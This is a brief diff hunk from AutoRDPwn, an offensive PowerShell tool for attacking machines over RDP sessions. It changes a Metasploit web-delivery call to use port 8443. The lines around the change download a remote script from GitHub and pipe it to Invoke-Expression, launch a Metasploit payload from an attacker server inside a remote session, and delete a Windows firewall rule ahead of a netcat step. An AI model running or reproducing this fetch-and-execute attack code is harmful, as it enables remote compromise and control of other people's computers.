@@ -629,7 +629,7 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/mas
 if ($metasploit){ invoke-command -session $RDP[0] -scriptblock { Write-Host
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-MetasploitPayload.ps1" -UseBasicParsing | iex 
 Write-Host "==================== Metasploit Web Delivery =========================" -ForegroundColor Gray
-Invoke-MetasploitPayload -url https://$metaserver/$metarandom -verbose
+Invoke-MetasploitPayload -url https://$metaserver:8443/$metarandom -verbose
 Write-Host "======================================================================" -ForegroundColor Gray ; Write-Host }}
 
 if ($netcat -in 'local'){ invoke-command -session $RDP[0] -scriptblock { Write-Host ; netsh advfirewall firewall delete rule name="Powershell Remote Control Application" 2>&1> $null
